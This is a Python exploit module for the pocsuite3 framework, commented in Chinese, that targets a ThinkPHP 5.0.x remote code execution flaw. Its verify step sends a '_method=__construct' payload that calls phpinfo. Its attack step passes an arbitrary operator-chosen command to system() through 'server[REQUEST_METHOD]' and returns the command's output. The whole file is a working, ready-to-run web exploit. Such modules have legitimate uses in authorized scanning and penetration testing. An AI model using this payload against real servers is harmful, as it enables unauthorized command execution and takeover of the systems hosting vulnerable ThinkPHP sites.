from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptString
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str


class POC(POCBase):
    vulID = '97767'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = 'Bin'  # PoC作者的大名
    vulDate = '2020-11-11'  # 漏洞公开的时间,不知道就写今天
    createDate = '2020-11-11'  # 编写 PoC 的日期
    updateDate = '2020-11-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'ThinkPHP 5.0.x 远程代码执行漏洞'  # PoC 名称
    appPowerLink = 'https://www.thinkphp.cn'  # 漏洞厂商主页地址
    appName = 'Thinkphp'  # 漏洞应用名称
    appVersion = '5.0.x'  # 漏洞影响版本
    vulType = 'Remote code execution'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
                Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_PO
                ST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。
            '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''使用Attck模式时可添加 --command参数用来指定需要执行的命令,如不指定该参数则默认执行whoami'''
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        flag = 'PHP Extension Build'
        path = '/index.php?s=captcha'
        url = self.url + path
        payload = {'_method': '__construct', 'filter[]': 'phpinfo', 'method': 'get', 'server[REQUEST_METHOD]': '1'}
        try:
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            req = requests.post(url, data=payload, headers=headers)
            if req and req.status_code == 200 and flag in req.text:
                result['VerfiryInfo'] = {}
                result['VerfiryInfo']['URL'] = self.url
                result['VerfiryInfo']['Postdata'] = payload
        except Exception as e:
            return
        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o['command'] = OptString('whoami', '输入需要执行的命令', require=False)
        return o

    def _attack(self):
        result = {}
        path = '/index.php?s=captcha'
        url = self.url + path
        command = self.get_option('command')
        payload = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={0}".format(command)
        try:
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            req = requests.post(url, data=payload, headers=headers)
            if req and req.status_code == 200:
                result['VerfiryInfo'] = {}
                result['VerfiryInfo']['URL'] = self.url
                result['VerfiryInfo']['Postdata'] = payload
                result['Stdout'] = "当前" + command + "命令执行结果：\n" + req.text.split('<!')[0]
        except Exception as e:
            return
        return self.parse_output(result)

    def _shell(self):
        pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(POC)
